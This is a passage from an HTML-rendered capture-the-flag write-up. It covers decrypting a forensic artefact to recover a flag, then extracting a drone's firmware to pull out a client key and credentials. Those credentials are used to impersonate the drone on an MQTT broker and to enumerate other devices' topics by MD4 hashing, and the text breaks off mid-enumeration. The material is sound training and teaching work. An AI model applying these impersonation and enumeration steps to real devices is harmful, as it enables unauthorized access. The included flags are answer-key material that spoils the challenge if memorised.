+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted_file_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">encrypted_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">encrypted_file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span> <span class="o">+</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_file_path</span> <span class="o">=</span> <span class="n">encrypted_file_path</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;.enc&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">decrypted_file_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">decrypted_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decrypted_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;File decrypted: </span><span class="si">{</span><span class="n">decrypted_file_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">7</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python decrypt.py &lt;dynamic_key&gt; &lt;fixed_key&gt; &lt;folder&gt; &lt;date&gt; &lt;iv&gt; &lt;encrypted_file&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">dkey</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fkey</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">folder</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">date</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">composite_key</span> <span class="o">=</span> <span class="n">compute_composite_key</span><span class="p">(</span><span class="n">dkey</span><span class="p">,</span> <span class="n">fkey</span><span class="p">,</span> <span class="n">folder</span><span class="p">,</span> <span class="n">date</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypt_file</span><span class="p">(</span><span class="n">encrypted_file</span><span class="p">,</span> <span class="n">composite_key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p>To run the script and decrypt the file, use the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 decrypt_files.py <span class="s1">&#39;35319a21dbe2ced1a7da56c2d717bb0d&#39;</span> <span class="s1">&#39;AA$F2-D8C1E7B9F3A35@C8@!BB2E1F0A7C3D&#39;</span> <span class="s1">&#39;\\dc01\shares\private&#39;</span> <span class="s1">&#39;2025-02-11T16:28:16Z&#39;</span> <span class="s1">&#39;D1@E2#F3%A4B5&amp;C6&#39;</span> crew_list.html.enc
+</span></span></code></pre></div><p>Executing this command will decrypt the file and reveal the flag.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/forensic_flag.png"
+        data-srcset="/assets/images/writeups/marine/forensic_flag.png, /assets/images/writeups/marine/forensic_flag.png 1.5x, /assets/images/writeups/marine/forensic_flag.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/forensic_flag.png"
+        title="marine_forensic_flag" /></p>
+<ul>
+<li>Flag : <strong>RM{PhLRCrYv2Ay4bxdGVm8Dct}</strong></li>
+</ul>
+<h2 id="step-6---iot">Step 6 - IoT</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/writeups/marine/mission6.png"
+        data-srcset="/assets/images/writeups/marine/mission6.png, /assets/images/writeups/marine/mission6.png 1.5x, /assets/images/writeups/marine/mission6.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/writeups/marine/mission6.png"
+        title="marine_mission6" /></p>
+<p>This step begins by analyzing the <code>flash.bin</code> file. We can start by extracting its metadata using the <code>file</code> and <code>binwalk</code> commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file flash.bin 
+</span></span><span class="line"><span class="cl">flash.bin: data
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ binwalk flash.bin 
+</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL  DESCRIPTION
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl"><span class="m">53536</span>         0xD120       U-Boot version string, <span class="s2">&#34;U-Boot 1.1.3 (Sep  3 2020 - 16:10:48)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="m">66048</span>         0x10200      LZMA compressed data, properties: 0x5D, dictionary size: <span class="m">8388608</span> bytes,..
+</span></span><span class="line"><span class="cl"><span class="m">1048576</span>       0x100000     Squashfs filesystem, little endian, version 4.0, size: <span class="m">3114</span> bytes, ...
+</span></span></code></pre></div><p>This file appears to correspond to a <strong>system firmware</strong>. According to the instructions, this is probably the firmware used by the captured drone.
+This firmware seems to contain several partitions that are very typical of embedded systems (<em>U-Boot, LZMA, SquashFS</em>). We&rsquo;ll now start by extracting the SquashFS partition present at offset <code>0x100000</code> and with a size of <code>3114 bytes</code>.
+We can use the <code>dd</code> command to do this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ dd <span class="k">if</span><span class="o">=</span>flash.bin <span class="nv">of</span><span class="o">=</span>03_sqfs.bin <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="nv">skip</span><span class="o">=</span><span class="k">$((</span><span class="m">0</span>x100000<span class="k">))</span> <span class="nv">count</span><span class="o">=</span><span class="m">3114</span>
+</span></span><span class="line"><span class="cl">$ file 03_sqfs.bin 
+</span></span><span class="line"><span class="cl">03_sqfs.bin: Squashfs filesystem, little endian, version 4.0, zlib compressed, <span class="m">3114</span> bytes, ...
+</span></span></code></pre></div><p>Now that we&rsquo;ve extracted the partition, we can unpack it and access the data stored on it.
+To do this, we can use the <code>unsquashfs</code> command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ unsquashfs -d 03_sqfs 03_sqfs.bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ tree 03_sqfs
+</span></span><span class="line"><span class="cl">├── config.ini
+</span></span><span class="line"><span class="cl">├── PHANTOM-CA.crt
+</span></span><span class="line"><span class="cl">├── PHANTOM-CX-8.crt
+</span></span><span class="line"><span class="cl">├── PHANTOM-CX-8.key
+</span></span><span class="line"><span class="cl">└── PHANTOM-CX-8.pub
+</span></span><span class="line"><span class="cl"><span class="m">0</span> directories, <span class="m">5</span> files
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ file 03_sqfs/*
+</span></span><span class="line"><span class="cl">03_sqfs/config.ini:       ASCII text
+</span></span><span class="line"><span class="cl">03_sqfs/PHANTOM-CA.crt:   ASCII text
+</span></span><span class="line"><span class="cl">03_sqfs/PHANTOM-CX-8.crt: ASCII text
+</span></span><span class="line"><span class="cl">03_sqfs/PHANTOM-CX-8.key: ASCII text
+</span></span><span class="line"><span class="cl">03_sqfs/PHANTOM-CX-8.pub: ASCII text
+</span></span></code></pre></div><p>We then notice the presence of several certificates, including one associated with a certification authority named <code>PHANTOM-CA</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ openssl x509 -in 03_sqfs/PHANTOM-CA.crt -text -noout
+</span></span><span class="line"><span class="cl">Certificate:
+</span></span><span class="line"><span class="cl">    Data:
+</span></span><span class="line"><span class="cl">        Version: <span class="m">3</span> <span class="o">(</span>0x2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        Serial Number:
+</span></span><span class="line"><span class="cl">            5d:39:00:81:4a:45:7c:c8:71:2f:83:f0:88:af:53:7a:a0:5a:68:97
+</span></span><span class="line"><span class="cl">        Signature Algorithm: ecdsa-with-SHA256
+</span></span><span class="line"><span class="cl">        Issuer: <span class="nv">CN</span> <span class="o">=</span> PHANTOM-CA
+</span></span><span class="line"><span class="cl">        Validity
+</span></span><span class="line"><span class="cl">            Not Before: Feb <span class="m">20</span> 09:01:26 <span class="m">2025</span> GMT
+</span></span><span class="line"><span class="cl">            Not After : Jan <span class="m">27</span> 09:01:26 <span class="m">2125</span> GMT
+</span></span><span class="line"><span class="cl">        Subject: <span class="nv">CN</span> <span class="o">=</span> PHANTOM-CA
+</span></span><span class="line"><span class="cl">        Subject Public Key Info:
+</span></span><span class="line"><span class="cl">            Public Key Algorithm: id-ecPublicKey
+</span></span><span class="line"><span class="cl">                Public-Key: <span class="o">(</span><span class="m">256</span> bit<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                pub:
+</span></span><span class="line"><span class="cl">                    04:00:83:92:2a:12:f4:98:b1:0a:e1:22:0e:6a:2c:
+</span></span><span class="line"><span class="cl">                    bb:b1:49:77:05:62:93:92:14:bc:3f:94:44:d3:cb:
+</span></span><span class="line"><span class="cl">                    2f:96:1e:12:b4:23:70:2b:1b:68:24:de:f4:e2:97:
+</span></span><span class="line"><span class="cl">                    1e:e9:e3:0a:c3:bc:cd:84:f4:87:ed:dc:1f:0e:6c:
+</span></span><span class="line"><span class="cl">                    18:71:51:98:cb
+</span></span><span class="line"><span class="cl">                ASN1 OID: prime256v1
+</span></span><span class="line"><span class="cl">                NIST CURVE: P-256
+</span></span><span class="line"><span class="cl">        X509v3 extensions:
+</span></span><span class="line"><span class="cl">            X509v3 Basic Constraints: critical
+</span></span><span class="line"><span class="cl">                CA:TRUE
+</span></span><span class="line"><span class="cl">            X509v3 Key Usage: critical
+</span></span><span class="line"><span class="cl">                Digital Signature, Certificate Sign, CRL Sign
+</span></span><span class="line"><span class="cl">            X509v3 Extended Key Usage: 
+</span></span><span class="line"><span class="cl">                TLS Web Server Authentication, TLS Web Client Authentication
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>As well as the presence of 3 files corresponding to the private key, public key and certificate of <code>PHANTOM-CX-8</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ openssl x509 -in 03_sqfs/PHANTOM-CX-8.crt -text -noout
+</span></span><span class="line"><span class="cl">Certificate:
+</span></span><span class="line"><span class="cl">    Data:
+</span></span><span class="line"><span class="cl">        Version: <span class="m">3</span> <span class="o">(</span>0x2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        Serial Number:
+</span></span><span class="line"><span class="cl">            62:73:aa:8a:36:f8:84:e6:d0:9f:c3:26:3c:5f:9b:3c:79:a3:d9:0d
+</span></span><span class="line"><span class="cl">        Signature Algorithm: ecdsa-with-SHA256
+</span></span><span class="line"><span class="cl">        Issuer: <span class="nv">CN</span> <span class="o">=</span> PHANTOM-CA
+</span></span><span class="line"><span class="cl">        Validity
+</span></span><span class="line"><span class="cl">            Not Before: Feb <span class="m">20</span> 09:58:46 <span class="m">2025</span> GMT
+</span></span><span class="line"><span class="cl">            Not After : Feb <span class="m">18</span> 09:58:46 <span class="m">2035</span> GMT
+</span></span><span class="line"><span class="cl">        Subject: <span class="nv">CN</span> <span class="o">=</span> PHANTOM-CX-8
+</span></span><span class="line"><span class="cl">        Subject Public Key Info:
+</span></span><span class="line"><span class="cl">            Public Key Algorithm: id-ecPublicKey
+</span></span><span class="line"><span class="cl">                Public-Key: <span class="o">(</span><span class="m">256</span> bit<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                pub:
+</span></span><span class="line"><span class="cl">                    04:bc:92:c9:14:84:04:38:21:8e:c9:48:99:07:60:
+</span></span><span class="line"><span class="cl">                    3b:b7:9e:70:fd:55:0b:53:ef:fb:82:f6:b4:97:34:
+</span></span><span class="line"><span class="cl">                    ae:e8:0f:41:85:be:0a:33:a2:6c:37:76:58:5b:6d:
+</span></span><span class="line"><span class="cl">                    b9:97:16:9b:94:97:f9:06:28:2e:96:83:d1:36:f5:
+</span></span><span class="line"><span class="cl">                    ac:e9:f3:bc:62
+</span></span><span class="line"><span class="cl">                ASN1 OID: prime256v1
+</span></span><span class="line"><span class="cl">                NIST CURVE: P-256
+</span></span><span class="line"><span class="cl">        X509v3 extensions:
+</span></span><span class="line"><span class="cl">            X509v3 Basic Constraints: critical
+</span></span><span class="line"><span class="cl">                CA:FALSE
+</span></span><span class="line"><span class="cl">            X509v3 Key Usage: critical
+</span></span><span class="line"><span class="cl">                Digital Signature, Key Encipherment
+</span></span><span class="line"><span class="cl">            X509v3 Extended Key Usage: 
+</span></span><span class="line"><span class="cl">                TLS Web Client Authentication
+</span></span><span class="line"><span class="cl">            X509v3 Subject Key Identifier: 
+</span></span><span class="line"><span class="cl">                26:9E:2A:2B:1B:1A:64:27:64:53:78:BE:EA:9C:CA:44:B9:BA:86:10
+</span></span><span class="line"><span class="cl">            X509v3 Authority Key Identifier: 
+</span></span><span class="line"><span class="cl">                5F:90:B8:72:42:48:B5:CC:B5:C6:F9:24:82:E1:AE:B1:2A:5D:57:3E
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>We also note that the <code>PHANTOM-CX-8.crt</code> certificate is limited to <strong>TLS Web Client Authentication</strong> use. This indicates that it appears to be used to access a resource requiring mandatory client authentication.
+Finally, the contents of <code>config.ini</code> appear to be a configuration file, probably used by the drone for nominal operation. It includes :</p>
+<ul>
+<li>A <code>global</code> section indicating <strong>an account name and password, a version number, a device name, its crypto method and its identifier;</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>global<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">user</span>  <span class="o">=</span> admin
+</span></span><span class="line"><span class="cl"><span class="nv">secret</span>  <span class="o">=</span> nimda
+</span></span><span class="line"><span class="cl"><span class="nv">soft_version</span> <span class="o">=</span> 8.9.1
+</span></span><span class="line"><span class="cl"><span class="nv">device_name</span> <span class="o">=</span> PHANTOM-XC-8
+</span></span><span class="line"><span class="cl"><span class="nv">device_crypto</span> <span class="o">=</span> md4
+</span></span><span class="line"><span class="cl"><span class="nv">device_id</span> <span class="o">=</span> fc92b2536b52521b916dfaa43ea0be05
+</span></span></code></pre></div><ul>
+<li>The <code>wireless</code> and <code>softap</code> sections provide information on Wi-Fi configuration;</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>wireless<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ssid</span>  <span class="o">=</span> PHANTOM-REMOTE-CONTROLE
+</span></span><span class="line"><span class="cl"><span class="nv">mode</span>  <span class="o">=</span> Infra
+</span></span><span class="line"><span class="cl"><span class="nv">security</span> <span class="o">=</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl"><span class="nv">password</span> <span class="o">=</span> 3BQAVP6X9
+</span></span><span class="line"><span class="cl"><span class="nv">running</span>  <span class="o">=</span> station
+</span></span><span class="line"><span class="cl"><span class="nv">cloud_connected</span><span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>softap<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">s_ssid</span>  <span class="o">=</span> PHANTOM-FACTORY
+</span></span><span class="line"><span class="cl"><span class="nv">s_password</span> <span class="o">=</span> factory
+</span></span></code></pre></div><ul>
+<li>The <code>video</code>, <code>record</code>, <code>camera</code> and <code>image</code> sections, which seem to give configuration information on the method of capture performed by the drone;</li>
+<li>A <code>cloud</code> section defining the terms <code>lorawan</code> and <code>mqtt</code> ;</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>cloud<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">lorawan</span>  <span class="o">=</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="nv">mqtt</span>  <span class="o">=</span> <span class="m">1</span>
+</span></span></code></pre></div><ul>
+<li>An <code>mqtt</code> section providing connectivity information (IP address, port number, endpoint, etc.);</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>mqtt<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">srv_addr</span> <span class="o">=</span> 212.83.175.198
+</span></span><span class="line"><span class="cl"><span class="nv">srv_port</span> <span class="o">=</span> <span class="m">17883</span>
+</span></span><span class="line"><span class="cl"><span class="nv">srv_sec</span>  <span class="o">=</span> mTLS
+</span></span><span class="line"><span class="cl"><span class="nv">srv_endpoint</span> <span class="o">=</span> drones/DEVICE_ID
+</span></span><span class="line"><span class="cl"><span class="nv">timeout_push</span> <span class="o">=</span> <span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="nv">timeout_pull</span> <span class="o">=</span> <span class="m">5</span>
+</span></span></code></pre></div><ul>
+<li>A <code>ping</code> section giving information on a connectivity test.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>ping<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ping_enable</span> <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ping_try</span> <span class="o">=</span> <span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ping_split</span> <span class="o">=</span> <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="nv">ping_ip</span>  <span class="o">=</span> 212.83.175.198
+</span></span></code></pre></div><p>As a reminder, the aim of this step is to be able to anticipate potential new attacks. The interesting information seems to be linked to this <code>cloud</code> connectivity of the <code>mqtt</code> type, whose configuration is as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>mqtt<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">srv_addr</span> <span class="o">=</span> 212.83.175.198
+</span></span><span class="line"><span class="cl"><span class="nv">srv_port</span> <span class="o">=</span> <span class="m">17883</span>
+</span></span><span class="line"><span class="cl"><span class="nv">srv_sec</span>  <span class="o">=</span> mTLS
+</span></span><span class="line"><span class="cl"><span class="nv">srv_endpoint</span> <span class="o">=</span> drones/DEVICE_ID
+</span></span><span class="line"><span class="cl"><span class="nv">timeout_push</span> <span class="o">=</span> <span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="nv">timeout_pull</span> <span class="o">=</span> <span class="m">5</span>
+</span></span></code></pre></div><p>After a little research, we understand that the <strong>MQTT</strong> communication protocol is often used in connected objects for information and metrics feedback. The drone probably uses this protocol to send information back to the attacker&rsquo;s central server.
+Our objective will be to try and usurp the identity of the drone we&rsquo;ve captured.</p>
+<p>MQTT is a protocol offering different authentication methods:</p>
+<ul>
+<li>Anonymous ;</li>
+<li>Login + password ;</li>
+<li>mTLS (mutual TLS).</li>
+</ul>
+<p>According to the <code>srv_sec = mTLS</code> configuration, the mutual TLS method is used. Under Linux, we can use the <code>mosquitto</code> project, which enables interaction with MQTT servers:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ apt install mosquitto-clients
+</span></span></code></pre></div><p>According to mosquitto&rsquo;s documentation, to set up mTLS authentication, you&rsquo;ll need to provide the following elements in order to listen to published messages (<code>subscriber</code> role):</p>
+<ul>
+<li>IP address of MQTT server (called <code>broker</code>) ;</li>
+<li>MQTT server port number;</li>
+<li>Listening Topic;</li>
+<li>Certificate authority certificate ;</li>
+<li>Client certificate ;</li>
+<li>Customer&rsquo;s private key.</li>
+</ul>
+<p>We have all the above information, except for the <code>topic</code>. This can be deduced from the following configuration elements:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>global<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">user</span>  <span class="o">=</span> admin
+</span></span><span class="line"><span class="cl"><span class="nv">secret</span>  <span class="o">=</span> nimda
+</span></span><span class="line"><span class="cl"><span class="nv">soft_version</span> <span class="o">=</span> 8.9.1
+</span></span><span class="line"><span class="cl"><span class="nv">device_name</span> <span class="o">=</span> PHANTOM-XC-8
+</span></span><span class="line"><span class="cl"><span class="nv">device_crypto</span> <span class="o">=</span> md4
+</span></span><span class="line"><span class="cl"><span class="nv">device_id</span> <span class="o">=</span> fc92b2536b52521b916dfaa43ea0be05
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>mqtt<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">srv_addr</span> <span class="o">=</span> 212.83.175.198
+</span></span><span class="line"><span class="cl"><span class="nv">srv_port</span> <span class="o">=</span> <span class="m">17883</span>
+</span></span><span class="line"><span class="cl"><span class="nv">srv_sec</span>  <span class="o">=</span> mTLS
+</span></span><span class="line"><span class="cl"><span class="nv">srv_endpoint</span> <span class="o">=</span> drones/DEVICE_ID
+</span></span><span class="line"><span class="cl"><span class="nv">timeout_push</span> <span class="o">=</span> <span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="nv">timeout_pull</span> <span class="o">=</span> <span class="m">5</span>
+</span></span></code></pre></div><p>We can see that the <code>srv_endpoint</code> attribute is set to <code>drones/DEVICE_ID</code> and that the <code>device_id</code> attribute above contains <code>fc92b2536b52521b916dfaa43ea0be05</code>. We can then assume that the <code>topic</code> is <code>drones/fc92b2536b52521b916dfaa43ea0be05</code>.</p>
+<p>We can thus construct the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mosquitto_sub -h 212.83.175.198 -p <span class="m">17883</span> --cafile ./PHANTOM-CA.crt --cert ./PHANTOM-CX-8.crt --key ./PHANTOM-CX-8.key -t <span class="s1">&#39;drones/fc92b2536b52521b916dfaa43ea0be05&#39;</span> --insecure -v
+</span></span><span class="line"><span class="cl">drones/fc92b2536b52521b916dfaa43ea0be05 14,107,11
+</span></span><span class="line"><span class="cl">drones/fc92b2536b52521b916dfaa43ea0be05 178,44,208
+</span></span><span class="line"><span class="cl">drones/fc92b2536b52521b916dfaa43ea0be05 168,164,199
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>We then notice that metrics are being sent to the topic <code>drones/fc92b2536b52521b916dfaa43ea0be05</code>.
+Since our aim is to identify and anticipate the presence of new drones, we need to find a way of monitoring the information sent to other drones used by the attacker.
+As mentioned, the notion of <code>topic</code> allows us to distinguish the different destinations of the data sent. Knowledge of the value <code>fc92b2536b52521b916dfaa43ea0be05</code>, which corresponds to the <code>device_id</code> attribute, seems to play the role of <code>secret</code>, as this value seems to be unique for each drone.
+Our objective is therefore to find the values associated with the other UAVs.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>global<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">user</span>  <span class="o">=</span> admin
+</span></span><span class="line"><span class="cl"><span class="nv">secret</span>  <span class="o">=</span> nimda
+</span></span><span class="line"><span class="cl"><span class="nv">soft_version</span> <span class="o">=</span> 8.9.1
+</span></span><span class="line"><span class="cl"><span class="nv">device_name</span> <span class="o">=</span> PHANTOM-XC-8
+</span></span><span class="line"><span class="cl"><span class="nv">device_crypto</span> <span class="o">=</span> md4
+</span></span><span class="line"><span class="cl"><span class="nv">device_id</span> <span class="o">=</span> fc92b2536b52521b916dfaa43ea0be05
+</span></span></code></pre></div><p>If we go back to the <code>global</code> section, we see that the <code>device_crypto</code> attribute has the value <code>md4</code>. After a little research, we understand that <code>md4</code> is the old version of the <code>md5</code> hash algorithm. Is the <code>device_id</code> the result of an <code>md4</code> calculation?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">python3</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">MD4</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-8&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;fc92b2536b52521b916dfaa43ea0be05&#39;</span>
+</span></span></code></pre></div><p>If we know the device_name, we can find the device_id!
+The format of the device_name seems to be <code>PHANTOM-XC-N</code>, with N ranging from 0 to 9. Let&rsquo;s try to calculate all possible device_ids:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">python3</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">MD4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-0&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;a6db0dd105f383d85a5b377e1eaa345c&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-1&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;759aac5f6088127cc0a8595e64f6e5a3&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-2&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;a6bcf8e8bb6d25740fbe1da6ab7c4a7e&#39;</span>
